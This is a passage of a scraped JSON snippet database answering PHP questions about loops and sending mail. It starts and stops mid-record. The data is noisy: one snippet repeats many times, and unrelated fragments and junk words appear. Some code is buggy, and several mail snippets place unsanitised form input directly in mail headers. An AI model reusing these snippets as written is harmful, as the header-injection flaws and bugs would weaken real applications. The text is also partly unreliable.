    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\n$arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; }\nfor ($i = 0; $i < count($array); $i++) {     echo $array[$i]['filename'];     echo $array[$i]['filepath']; }\n$arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }\nforeach (array as $value){    //code to be executed;    print(\"value : $value\"); }   foreach (array as  $key => $value){    //code to be executed;    print(\"key[$key] => $value\"); } \n<?php $arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; } // $arr is now array(2, 4, 6, 8) unset($value); // break the reference with the last element ?>\n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3847,
    "keyword": null,
    "link": null,
    "title": " php loop backwards through array",
    "description": "for($i = count($array) - 1; $i >= 0; $i--){  }\n$array = array_reverse($array); foreach($array as $currentElement) {}\n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3848,
    "keyword": null,
    "link": null,
    "title": " php loop object",
    "description": " <?php class MyClass {     public $var1 = 'value 1';     public $var2 = 'value 2';     public $var3 = 'value 3';      protected $protected = 'protected var';     private   $private   = 'private var';      function iterateVisible() {        echo \"MyClass::iterateVisible:\\n\";        foreach ($this as $key => $value) {            print \"$key => $value\\n\";        }     } }  $class = new MyClass();  foreach($class as $key => $value) {     print \"$key => $value\\n\"; } echo \"\\n\";   $class->iterateVisible();  ?>  \n$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }\necho $obj->name; echo $obj->age;\n <?php class MyClass  {   public $var1 = 'valeur 1';   public $var2 = 'valeur 2';   public $var3 = 'valeur 3';    protected $protected = 'variable prot&eacute;g&eacute;e';   private   $private   = 'variable priv&eacute;e';    function iterateVisible() {      echo \"MyClass::iterateVisible:\\n\";      foreach ($this as $key => $value) {          print \"$key => $value\\n\";      }   } }  $class = new MyClass();  foreach($class as $key => $value) {     print \"$key => $value\\n\"; } echo \"\\n\";   $class->iterateVisible();  \n// Try edit message const data = {   message: 'Hello world', }  $('#msg').html(data.message)  console.log(data)\n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3849,
    "keyword": null,
    "link": null,
    "title": " php loop through array",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\nfor ($i = 0; $i < count($array); $i++) {     echo $array[$i]['filename'];     echo $array[$i]['filepath']; }\nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement \n$letters = ['a','b','c']; foreach ($letters as $item) {   echo $item; }\nforeach($array as $item=>$values){      echo $values->filepath;     }\nforeach($array as $item) {     echo $item['filename'];     echo $item['filepath'];      // to know what's in $item     echo '<pre>'; var_dump($item); }\n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3850,
    "keyword": null,
    "link": null,
    "title": " php loop through array of objects",
    "description": "foreach($request as $i => $i_value) {     echo $i_value->name; }\n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3851,
    "keyword": null,
    "link": null,
    "title": " php loop through class properties",
    "description": "foreach ($obj as $key => $value) {     echo \"$key => $value\\n\"; }\n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3852,
    "keyword": null,
    "link": null,
    "title": " php loop through every day of the year",
    "description": "$begin = new DateTime( \"2015-07-03\" ); $end   = new DateTime( \"2015-07-09\" );  for($i = $begin; $i <= $end; $i->modify('+1 day')){     echo $i->format(\"Y-m-d\"); }\n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3853,
    "keyword": null,
    "link": null,
    "title": " php loop through json",
    "description": "$arr = json_decode('[{\"var1\":\"9\",\"var2\":\"16\",\"var3\":\"16\"},{\"var1\":\"8\",\"var2\":\"15\",\"var3\":\"15\"}]');  foreach($arr as $item) { //foreach element in $arr     $uses = $item['var1']; //etc }\n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3854,
    "keyword": null,
    "link": null,
    "title": " php loop through months",
    "description": "$start = $month = strtotime('2009-02-01'); $end = strtotime('2011-01-01'); while($month < $end) {      echo date('F Y', $month), PHP_EOL;      $month = strtotime(\"+1 month\", $month); }\n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3855,
    "keyword": null,
    "link": null,
    "title": " php loop through object",
    "description": "foreach ($obj as $key => $value) {     echo \"$key => $value\\n\";     //echo \"test greper\"; } \nforeach ($obj as $key => $value) {   echo \"$value\\n\"; }\nforeach ($objects as $obj) {    echo $obj->property; }\nforeach ($obj as $key => $value) {     echo \"$key => $value\\n\"; }\n$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }$person = new StdClass(); $person->name = \"Taylor\"; $person->age = 31;  foreach ($person as $key => $value) {     echo $key.\",\".$value.\"\\n\"; }\nforeach ($objects as $obj){       echo $obj->user->description; } \n// Try edit message const data = {   message: 'Hello world', }  $('#msg').html(data.message)  console.log(data)\n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3856,
    "keyword": null,
    "link": null,
    "title": " php loop through objects",
    "description": "foreach($class as $key => $value) {     print \"$key => $value\\n\"; }\nforeach ($obj as $key => $value) {     echo \"$key => $value\\n\"; } \n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3857,
    "keyword": null,
    "link": null,
    "title": " php loop through start and end date",
    "description": "$begin = new DateTime( \"2015-07-03\" ); $end   = new DateTime( \"2015-07-09\" );  for($i = $begin; $i <= $end; $i->modify('+1 day')){     echo $i->format(\"Y-m-d\"); }\n$startTime = strtotime( '2010-05-01 12:00' ); $endTime = strtotime( '2010-05-10 12:00' );  // Loop between timestamps, 24 hours at a time for ( $i = $startTime; $i <= $endTime; $i = $i + 86400 ) {   $thisDate = date( 'Y-m-d', $i ); // 2010-05-01, 2010-05-02, etc } \n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3858,
    "keyword": null,
    "link": null,
    "title": " php loop x times",
    "description": "for ($i = 1; $i <= 10; $i++) {     echo $i; }\n<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n",
    "reg_date": "2021-10-12T10:18:43.000Z"
  },
  {
    "id": 3859,
    "keyword": null,
    "link": null,
    "title": " php loops",
    "description": "<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n/* For loop in php */  <?php for ($i = 0; $i < 10; $i++) {      echo $i.\"<br>\"; }  ?>\nfor($i = 0; $i <=10; $i++){ \techo \"The index is $i\"; }\n#Loops  <?php     #loops execute code a set number of times     /*     Types of loops     1-For     2-While     3-Do..while     4 Foreach     */      # For Loop usually use if you know the number of times it has to execute     # @params -it takes an init, condition, increment     #for($i =0;$i<=11;$i++){     #echo 'Number: '.$i;     #echo '<br>';     #}     #While loop     # @ prams - condition     #$i = 0;     #while($i < 10){     #    echo $i;     #    echo '<br>';     #    $i++;     #}     # Do...while loops     #@prapms - condition     /*$i = 0;     do{         echo $i;         echo '<br>';         $i++;         }         while($i < 10);*/     # Foreach  --- is for arrays          # $people = array('Brad', 'Jose', 'William');     #     foreach($people as $person){     #     echo $person;     #     echo '<br>';     # }     $people = array('Tony' => 'tony@example.com',         'Jose' => 'jose@example.com','William' => 'William@example.com');           foreach($people as $person => $email){         echo $person.': '.$email;         echo '<br>'; } ?>\ndo {     code to be executed } while (condition)\nfor (initialization; condition; increment){    code to be executed; } //Example <?php     $a = 0;     $b = 0;  for( $i = 0; $i<5; $i++ )     {         $a += 10;         $b += 5;     }     echo (\"At the end of the loop a = $a and b = $b\" ); ?> //.......................................//   do {    code to be executed; } while (condition); //Example <?php      $i = 0;     $num = 0;             do {        $i++;      }             while( $i < 10 );  echo (\"Loop stopped at i = $i\" ); ?>\n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3860,
    "keyword": null,
    "link": null,
    "title": " php loopthrough object",
    "description": "foreach ($objects as $obj) {    echo $obj->property; }\n// Try edit message const data = {   message: 'Hello world', }  $('#msg').html(data.message)  console.log(data)\n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3861,
    "keyword": null,
    "link": null,
    "title": " php lowercase assoc array",
    "description": "array_walk($yourArray, function(&$value) {   $value = strtolower($value); });\n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3862,
    "keyword": null,
    "link": null,
    "title": " php magic methods",
    "description": "/* The following function names are magical in PHP classes.  You cannot have functions with these names in any of  your classes unless you want the magic functionality  associated with them. */ __construct(),  __destruct(),  __call(),  __callStatic(),  __get(),  __set(), __isset(),  __unset(),  __sleep(),  __wakeup(),  __serialize(), __unserialize(),  __toString(),  __invoke(),  __set_state(),  __clone(),   __debugInfo() \n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3863,
    "keyword": null,
    "link": null,
    "title": " php mail",
    "description": "<?php $to = $_POST['email']; $subject = \"Email Subject\";  $message = 'Dear '.$_POST['name'].',<br>'; $message .= \"We welcome you to be part of family<br><br>\"; $message .= \"Regards,<br>\";  // Always set content-type when sending HTML email $headers = \"MIME-Version: 1.0\" . \"\\r\\n\"; $headers .= \"Content-type:text/html;charset=UTF-8\" . \"\\r\\n\";  // More headers $headers .= 'From: <enquiry@example.com>' . \"\\r\\n\"; $headers .= 'Cc: myboss@example.com' . \"\\r\\n\";  mail($to,$subject,$message,$headers); ?>\n// use this library -> https://github.com/PHPMailer/PHPMailer  <?php use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception; function sendEmail(){   \trequire 'phpmailer/vendor/autoload.php';\t      //Create an instance; passing `true` enables exceptions     $mail = new PHPMailer(true);     $mail->CharSet = 'UTF-8';   try {       $receiver = 'test@gmail.com';       $name = 'Name';        //Server settings       $mail->SMTPDebug = 1;                      //Enable verbose debug output       $mail->isSMTP();                                            //Send using SMTP       $mail->Host       = 'tls://smtp.gmail.com';                     //Set the SMTP server to send through       $mail->SMTPAuth   = true;                                   //Enable SMTP authentication       $mail->Username   = 'username@gmail.com';                     //SMTP username       $mail->Password   = 'PASSWORD';                               //SMTP password       $mail->SMTPSecure = tls;            //Enable implicit TLS encryption       $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`        //Recipients       $mail->From = 'test@gmail.com';       $mail->setFrom('test@gmail.com', 'Name');       $mail->addAddress($receiver, $name);     //Add a recipient        //Content       $mail->isHTML(true);                                  //Set email format to HTML       $mail->Subject = 'Subject';       $mail->Body    = 'Body';        $mail->send();       echo 'Message has been sent';   } catch (Exception $e) {       echo \"Message could not be sent. Mailer Error: {$mail->ErrorInfo}\";   } } ?>\n<?php     mail(\"recipient@example.com\",         \"This is the message subject\",         \"This is the message body\",         \"From: sender@example.com\" . \"\\r\\n\" . \"Content-Type: text/plain; charset=utf-8\",         \"-fsender@example.com\"); ?>\nmnjah\n<?php // Multiple recipients $to = 'johny@example.com, sally@example.com'; // note the comma  // Subject $subject = 'Birthday Reminders for August';  // Message $message = ' <html> <head>   <title>Birthday Reminders for August</title> </head> <body>   <p>Here are the birthdays upcoming in August!</p>   <table>     <tr>       <th>Person</th><th>Day</th><th>Month</th><th>Year</th>     </tr>     <tr>       <td>Johny</td><td>10th</td><td>August</td><td>1970</td>     </tr>     <tr>       <td>Sally</td><td>17th</td><td>August</td><td>1973</td>     </tr>   </table> </body> </html> ';  // To send HTML mail, the Content-type header must be set $headers[] = 'MIME-Version: 1.0'; $headers[] = 'Content-type: text/html; charset=iso-8859-1';  // Additional headers $headers[] = 'To: Mary <mary@example.com>, Kelly <kelly@example.com>'; $headers[] = 'From: Birthday Reminder <birthday@example.com>'; $headers[] = 'Cc: birthdayarchive@example.com'; $headers[] = 'Bcc: birthdaycheck@example.com';  // Mail it if(mail($to, $subject, $message, implode(\"\\r\\n\", $headers))){   echo \"success\"; }else{   echo \"Echec send email\"; } ; ?>\n$mailtext = '<html> <head>     <title>HTML-E-Mail mit PHP erstellen</title> </head>  <body> ... </body> </html> ';  $empfaenger = \"du@example.com\";  // Mailadresse $absender   = \"ich@example.com\"; $betreff    = \"Mail-Test - HTML-E-Mail mit PHP erstellen\"; $antwortan  = \"ICH@example.com\";  $header  = \"MIME-Version: 1.0\\r\\n\"; $header .= \"Content-type: text/html; charset=utf-8\\r\\n\";  $header .= \"From: $absender\\r\\n\"; $header .= \"Reply-To: $antwortan\\r\\n\"; // $header .= \"Cc: $cc\\r\\n\";  // falls an CC gesendet werden soll $header .= \"X-Mailer: PHP \". phpversion();  mail( $empfaenger,       $betreff,       $mailtext,       $header);  echo \"Mail wurde gesendet!\";\n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3864,
    "keyword": null,
    "link": null,
    "title": " php mail function",
    "description": "<?php $to = $_POST['email']; $subject = \"Email Subject\";  $message = 'Dear '.$_POST['name'].',<br>'; $message .= \"We welcome you to be part of family<br><br>\"; $message .= \"Regards,<br>\";  // Always set content-type when sending HTML email $headers = \"MIME-Version: 1.0\" . \"\\r\\n\"; $headers .= \"Content-type:text/html;charset=UTF-8\" . \"\\r\\n\";  // More headers $headers .= 'From: <enquiry@example.com>' . \"\\r\\n\"; $headers .= 'Cc: myboss@example.com' . \"\\r\\n\";  mail($to,$subject,$message,$headers); ?>\n// use this library -> https://github.com/PHPMailer/PHPMailer  <?php use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception; function sendEmail(){   \trequire 'phpmailer/vendor/autoload.php';\t      //Create an instance; passing `true` enables exceptions     $mail = new PHPMailer(true);     $mail->CharSet = 'UTF-8';   try {       $receiver = 'test@gmail.com';       $name = 'Name';        //Server settings       $mail->SMTPDebug = 1;                      //Enable verbose debug output       $mail->isSMTP();                                            //Send using SMTP       $mail->Host       = 'tls://smtp.gmail.com';                     //Set the SMTP server to send through       $mail->SMTPAuth   = true;                                   //Enable SMTP authentication       $mail->Username   = 'username@gmail.com';                     //SMTP username       $mail->Password   = 'PASSWORD';                               //SMTP password       $mail->SMTPSecure = tls;            //Enable implicit TLS encryption       $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`        //Recipients       $mail->From = 'test@gmail.com';       $mail->setFrom('test@gmail.com', 'Name');       $mail->addAddress($receiver, $name);     //Add a recipient        //Content       $mail->isHTML(true);                                  //Set email format to HTML       $mail->Subject = 'Subject';       $mail->Body    = 'Body';        $mail->send();       echo 'Message has been sent';   } catch (Exception $e) {       echo \"Message could not be sent. Mailer Error: {$mail->ErrorInfo}\";   } } ?>\n<?php     mail(\"recipient@example.com\",         \"This is the message subject\",         \"This is the message body\",         \"From: sender@example.com\" . \"\\r\\n\" . \"Content-Type: text/plain; charset=utf-8\",         \"-fsender@example.com\"); ?>\n<?php $to      = 'nobody@example.com'; $subject = 'the subject'; $message = 'hello'; $headers = 'From: Jack Sparrow <jsparrow@blackpearl.com>' . PHP_EOL .     'Reply-To: Jack Sparrow <jsparrow@blackpearl.com>' . PHP_EOL .     'X-Mailer: PHP/' . phpversion();  mail($to, $subject, $message, $headers); ?>\n<?php require 'PHPMailerAutoload.php';  $mail = new PHPMailer;  //$mail->SMTPDebug = 3;                               // Enable verbose debug output  $mail->isSMTP();                                      // Set mailer to use SMTP $mail->Host = 'smtp1.example.com;smtp2.example.com';  // Specify main and backup SMTP servers $mail->SMTPAuth = true;                               // Enable SMTP authentication $mail->Username = 'user@example.com';                 // SMTP username $mail->Password = 'secret';                           // SMTP password $mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted $mail->Port = 587;                                    // TCP port to connect to  $mail->setFrom('from@example.com', 'Mailer'); $mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient $mail->addAddress('ellen@example.com');               // Name is optional $mail->addReplyTo('info@example.com', 'Information'); $mail->addCC('cc@example.com'); $mail->addBCC('bcc@example.com');  $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name $mail->isHTML(true);                                  // Set email format to HTML  $mail->Subject = 'Here is the subject'; $mail->Body    = 'This is the HTML message body <b>in bold!</b>'; $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';  if(!$mail->send()) {     echo 'Message could not be sent.';     echo 'Mailer Error: ' . $mail->ErrorInfo; } else {     echo 'Message has been sent'; }\n<?php \t//Sending mail from contact form page.   \t// It works perfectly for me.    \t//Edit it and make it your own.   \t   \t     $to = \"example.com@gmail.com\";     $from = $_POST['email'];     $name = $_POST['name'];     $subject = $_POST['subject'];     $number = $_POST['number'];     $cmessage = $_POST['message'];      $headers = \"From: $from\"; \t$headers = \"From: \" . $from . \"\\r\\n\"; \t$headers .= \"Reply-To: \". $from . \"\\r\\n\"; \t$headers .= \"MIME-Version: 1.0\\r\\n\"; \t$headers .= \"Content-Type: text/html; charset=ISO-8859-1\\r\\n\";      $subject = \"You have a message from your Bitmap Photography.\";      $logo = 'img/logo.png';     $link = '#';  \t$body = \"<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>Express Mail</title></head><body>\"; \t$body .= \"<table style='width: 100%;'>\"; \t$body .= \"<thead style='text-align: center;'><tr><td style='border:none;' colspan='2'>\"; \t$body .= \"<a href='{$link}'><img src='{$logo}' alt=''></a><br><br>\"; \t$body .= \"</td></tr></thead><tbody><tr>\"; \t$body .= \"<td style='border:none;'><strong>Name:</strong> {$name}</td>\"; \t$body .= \"<td style='border:none;'><strong>Email:</strong> {$from}</td>\"; \t$body .= \"</tr>\"; \t$body .= \"<tr><td style='border:none;'><strong>Subject:</strong> {$csubject}</td></tr>\"; \t$body .= \"<tr><td></td></tr>\"; \t$body .= \"<tr><td colspan='2' style='border:none;'>{$cmessage}</td></tr>\"; \t$body .= \"</tbody></table>\"; \t$body .= \"</body></html>\";      $send = mail($to, $subject, $body, $headers);  ?>\n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3865,
    "keyword": null,
    "link": null,
    "title": " php mail function from name",
    "description": "<?php $to = $_POST['email']; $subject = \"Email Subject\";  $message = 'Dear '.$_POST['name'].',<br>'; $message .= \"We welcome you to be part of family<br><br>\"; $message .= \"Regards,<br>\";  // Always set content-type when sending HTML email $headers = \"MIME-Version: 1.0\" . \"\\r\\n\"; $headers .= \"Content-type:text/html;charset=UTF-8\" . \"\\r\\n\";  // More headers $headers .= 'From: <enquiry@example.com>' . \"\\r\\n\"; $headers .= 'Cc: myboss@example.com' . \"\\r\\n\";  mail($to,$subject,$message,$headers); ?>\n// use this library -> https://github.com/PHPMailer/PHPMailer  <?php use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception; function sendEmail(){   \trequire 'phpmailer/vendor/autoload.php';\t      //Create an instance; passing `true` enables exceptions     $mail = new PHPMailer(true);     $mail->CharSet = 'UTF-8';   try {       $receiver = 'test@gmail.com';       $name = 'Name';        //Server settings       $mail->SMTPDebug = 1;                      //Enable verbose debug output       $mail->isSMTP();                                            //Send using SMTP       $mail->Host       = 'tls://smtp.gmail.com';                     //Set the SMTP server to send through       $mail->SMTPAuth   = true;                                   //Enable SMTP authentication       $mail->Username   = 'username@gmail.com';                     //SMTP username       $mail->Password   = 'PASSWORD';                               //SMTP password       $mail->SMTPSecure = tls;            //Enable implicit TLS encryption       $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`        //Recipients       $mail->From = 'test@gmail.com';       $mail->setFrom('test@gmail.com', 'Name');       $mail->addAddress($receiver, $name);     //Add a recipient        //Content       $mail->isHTML(true);                                  //Set email format to HTML       $mail->Subject = 'Subject';       $mail->Body    = 'Body';        $mail->send();       echo 'Message has been sent';   } catch (Exception $e) {       echo \"Message could not be sent. Mailer Error: {$mail->ErrorInfo}\";   } } ?>\n<?php $to      = 'nobody@example.com'; $subject = 'the subject'; $message = 'hello'; $headers = 'From: Jack Sparrow <jsparrow@blackpearl.com>' . PHP_EOL .     'Reply-To: Jack Sparrow <jsparrow@blackpearl.com>' . PHP_EOL .     'X-Mailer: PHP/' . phpversion();  mail($to, $subject, $message, $headers); ?>\n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3866,
    "keyword": null,
    "link": null,
    "title": " php mail image",
    "description": "<?php //---------------------------------- // Construction de l'ent&ecirc;te //---------------------------------- $delimiteur = \"-----=\".md5(uniqid(rand()));  $entete = \"MIME-Version: 1.0\\r\\n\"; $entete .= \"Content-Type: multipart/related; boundary=\\\"$delimiteur\\\"\\r\\n\"; $entete .= \"\\r\\n\";  //-------------------------------------------------- // Construction du message proprement dit //--------------------------------------------------  $msg = \"Je vous informe que ceci est un message au format MIME 1.0 multipart/mixed.\\r\\n\";  //--------------------------------- // 1&egrave;re partie du message // Le code HTML //--------------------------------- $msg .= \"--$delimiteur\\r\\n\"; $msg .= \"Content-Type: text/html; charset=\\\"utf-8\\\"\\r\\n\"; $msg .= \"Content-Transfer-Encoding:8bit\\r\\n\"; $msg .= \"\\r\\n\"; $msg .= \"<html><body><h1>Email HTML avec 2 images</h1>\"; $msg .= \"Image 1:<img src=\\\"cid:image1\\\"><br />\"; $msg .= \"Image 2:<img src=\\\"cid:image2\\\"><br /></body></html>\\r\\n\"; $msg .= \"\\r\\n\";  //--------------------------------- // 2nde partie du message // Le 1er fichier (inline) //--------------------------------- $fichier = 'monfichier.jpg'; $fp      = fopen($fichier, \"rb\"); $fichierattache = fread($fp, filesize($fichier)); fclose($fp); $fichierattache = chunk_split(base64_encode($fichierattache));  $msg .= \"--$delimiteur\\r\\n\"; $msg .= \"Content-Type: application/octet-stream; name=\\\"$fichier\\\"\\r\\n\"; $msg .= \"Content-Transfer-Encoding: base64\\r\\n\"; $msg .= \"Content-ID: <image1>\\r\\n\"; $msg .= \"\\r\\n\"; $msg .= $fichierattache . \"\\r\\n\"; $msg .= \"\\r\\n\\r\\n\";  //--------------------------------- // 3&egrave;me partie du message // Le 2&egrave;me fichier (attachment) //--------------------------------- $fichier = 'monfichier2.jpg'; $fp      = fopen($fichier, \"rb\"); $fichierattache = fread($fp, filesize($fichier)); fclose($fp); $fichierattache = chunk_split(base64_encode($fichierattache));  $msg .= \"--$delimiteur\\r\\n\"; $msg .= \"Content-Type: application/octet-stream; name=\\\"$fichier\\\"\\r\\n\"; $msg .= \"Content-Transfer-Encoding: base64\\r\\n\"; $msg .= \"Content-ID: <image2>\\r\\n\"; $msg .= \"\\r\\n\"; $msg .= $fichierattache . \"\\r\\n\"; $msg .= \"\\r\\n\\r\\n\";  $msg .= \"--$delimiteur\\r\\n\";  $destinataire = 'testemail@toutestfacile.com'; $expediteur   = 'moi@monsite.com'; $reponse      = $expediteur; echo \"Ce script envoie un mail au format HTML avec 2 images &agrave; $destinataire\"; mail($destinataire,      'Email HTML avec 2 images',      $msg,      \"Reply-to: $reponse\\r\\nFrom: $expediteur\\r\\n\".$entete); ?>\n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3867,
    "keyword": null,
    "link": null,
    "title": " php mail in localhost wamp",
    "description": "1) Edit C:\\wamp\\sendmail\\sendmail.ini:  smtp_server=smtp.gmail.com smtp_port=465 auth_username=user@gmail.com auth_password=your_password 2) Edit php.ini and set sendmail_path  sendmail_path = \"C:\\wamp\\sendmail\\sendmail.exe -t\" \n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3868,
    "keyword": null,
    "link": null,
    "title": " php mail success message",
    "description": "if(mail($ToEmail, $EmailSubject, $MESSAGE_BODY, $mailheader))       {       echo \"<script>document.location.href='contact.php'</script>\";       }       else       {       echo \"<script>alert('Mail was not sent. Please try again later');</script>\";       }      }\n",
    "reg_date": "2021-10-12T10:18:44.000Z"
  },
  {
    "id": 3869,
    "keyword": null,
    "link": null,
    "title": " php mailer",
    "description": "<?php $to = $_POST['email']; $subject = \"Email Subject\";  $message = 'Dear '.$_POST['name'].',<br>'; $message .= \"We welcome you to be part of family<br><br>\"; $message .= \"Regards,<br>\";  // Always set content-type when sending HTML email $headers = \"MIME-Version: 1.0\" . \"\\r\\n\"; $headers .= \"Content-type:text/html;charset=UTF-8\" . \"\\r\\n\";  // More headers $headers .= 'From: <enquiry@example.com>' . \"\\r\\n\"; $headers .= 'Cc: myboss@example.com' . \"\\r\\n\";  mail($to,$subject,$message,$headers); ?>\n<?php require 'PHPMailerAutoload.php';  $mail = new PHPMailer;  //$mail->SMTPDebug = 3;                               // Enable verbose debug output  $mail->isSMTP();                                      // Set mailer to use SMTP $mail->Host = 'smtp1.example.com;smtp2.example.com';  // Specify main and backup SMTP servers $mail->SMTPAuth = true;                               // Enable SMTP authentication $mail->Username = 'user@example.com';                 // SMTP username $mail->Password = 'secret';                           // SMTP password $mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted $mail->Port = 587;                                    // TCP port to connect to  $mail->setFrom('from@example.com', 'Mailer'); $mail->addAddress('joe@example.net', 'Joe User');     // Add a 